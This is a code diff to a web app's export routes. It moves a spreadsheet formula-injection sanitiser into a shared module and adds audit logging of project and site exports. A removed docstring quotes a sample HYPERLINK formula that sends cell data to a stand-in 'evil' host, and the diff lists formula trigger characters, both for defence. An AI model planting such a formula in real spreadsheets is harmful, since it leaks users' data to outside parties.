@@ -38,36 +38,15 @@ from app.models.tag import Tag, TagSite
 from app.models.team import Team
 from app.models.user import User, UserSite
 from app.models.vacation import Vacation
-from app.services import instance_settings
+from app.services import audit_log, instance_settings
 from app.services.approvals import pending_change_text
 from app.services.booking_segments import effective_dates
+from app.services.csv_safety import safe_cell
 from app.services.project_field_rules import load_project_field_values, round_field_number
 from app.services.site_access import ensure_project_visible, ensure_site_access
 from app.utils import utcnow_naive
 
 router = APIRouter(tags=["export"])
-
-
-# Leading characters that make Excel / LibreOffice / Sheets treat a cell as a
-# formula (or DDE payload). Tab and CR are included per OWASP's CSV-injection
-# guidance.
-_FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")
-
-
-def _safe_cell(value: Any) -> Any:
-    """
-    Neutralise spreadsheet formula injection in a user-controlled cell value.
-
-    Names, notes, comments and descriptions are free text from any user; a
-    value such as ``=HYPERLINK("http://evil/?"&A1,"open")`` would otherwise be
-    written as a live formula (openpyxl types any string starting with ``=``
-    as one) or evaluated when a CSV is opened. Strings starting with a
-    trigger character get a leading single quote; every other value --
-    numbers, dates, None -- is returned untouched.
-    """
-    if isinstance(value, str) and value.startswith(_FORMULA_TRIGGERS):
-        return "'" + value
-    return value
 
 
 @dataclass(frozen=True)
@@ -300,10 +279,10 @@ def generate_csv(tasks: list[dict[str, Any]], project_name: str) -> str:
         ]
     )
 
-    # Data rows (every cell through _safe_cell: names/notes are user text)
+    # Data rows (every cell through safe_cell: names/notes are user text)
     for task in tasks:
         writer.writerow(
-            _safe_cell(cell)
+            safe_cell(cell)
             for cell in [
                 task["id"],
                 task["name"],
@@ -393,6 +372,23 @@ def format_xml_date(d: date) -> str:
     return f"{d.isoformat()}T08:00:00"
 
 
+async def _record_export(
+    db: AsyncSession, request: Request, user: User, action: str, project, rows: int
+) -> None:
+    """The ``access`` row of a project export, once the file is built (get_db
+    commits it with the request)."""
+    await audit_log.record(
+        db,
+        request,
+        action=action,
+        category="access",
+        actor=user,
+        target=("project", project.id, project.name),
+        project_id=project.id,
+        context={"rows": rows},
+    )
+
+
 @router.post("/export/mpp/{project_id}")
 async def export_project_to_mpp(
     project_id: int,
@@ -418,6 +414,7 @@ async def export_project_to_mpp(
 
     # Generate XML
     xml_content = generate_xml(tasks, project.name, project)
+    await _record_export(db, request, user, "access.export.msproject", project, len(tasks))
 
     # Return as file download
     filename = f"{project.name.replace(' ', '_')}.xml"
@@ -454,6 +451,7 @@ async def export_project_to_csv(
 
     # Generate CSV
     csv_content = generate_csv(tasks, project.name)
+    await _record_export(db, request, user, "access.export.csv", project, len(tasks))
 
     # Return as file download
     filename = f"{project.name.replace(' ', '_')}.csv"
@@ -793,14 +791,14 @@ async def build_site_export_workbook(db: AsyncSession, site_id: int) -> tuple[by
 
     def add_sheet(title: str, headers: list[str], rows: list[list[Any]]) -> None:
         ws = wb.create_sheet(title=title[:31])  # Excel sheet name max 31 chars
-        ws.append([_safe_cell(h) for h in headers])
+        ws.append([safe_cell(h) for h in headers])
         for cell in ws[1]:
             cell.font = header_font
             cell.fill = header_fill
         for row_index, row in enumerate(rows, start=2):  # row 1 holds the headers
             # Every workbook cell goes through here: escape user text so it
             # can never be stored as a formula.
-            ws.append([v.value if isinstance(v, _FormattedNumber) else _safe_cell(v) for v in row])
+            ws.append([v.value if isinstance(v, _FormattedNumber) else safe_cell(v) for v in row])
             for column, v in enumerate(row, start=1):
                 if isinstance(v, _FormattedNumber):
                     ws.cell(row=row_index, column=column).number_format = v.number_format
@@ -1665,6 +1663,15 @@ async def export_site_to_excel(
     await ensure_site_access(request, db, user, [site_id], "Access denied to this site")
 
     content, filename = await build_site_export_workbook(db, site_id)
+    site = await db.get(Site, site_id)
+    await audit_log.record(
+        db,
+        request,
+        action="access.export.site",
+        category="access",
+        actor=user,
+        target=("site", site_id, site.name if site is not None else None),
+    )
     return Response(
         content=content,
         media_type=("application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"),
